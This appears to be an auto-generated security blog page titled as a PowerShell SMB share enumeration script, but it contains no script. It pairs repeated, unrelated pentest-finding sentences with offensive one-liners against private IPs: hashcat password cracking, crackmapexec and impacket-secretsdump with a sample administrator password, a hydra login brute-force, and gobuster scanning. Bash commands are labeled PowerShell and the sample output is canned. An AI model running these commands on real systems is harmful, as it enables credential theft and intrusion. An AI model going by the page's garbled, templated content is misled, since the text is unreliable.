---
TitleSEO: "SMB Share Enumeration Script in PowerShell | ZureFX"
TitlePost: "SMB Share Enumeration Script — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for smb share enumeration script. Built for security research and automation."
Keywords: "powershell, tool, go"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-352.html"
URL_IMAGES: ""
Date: "2024-05-15"
Tags: "PowerShell, Tool, Go"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-352"
Permalink: "/scripting/script-smb-share-enumeration-script-352.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `hydra`
- `wmiexec`
- `sharphound`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
crackmapexec smb 10.113.50.193 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.46.236.180/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.161.118
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.64.165 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 15 results
[+] Done in 25.53s
```
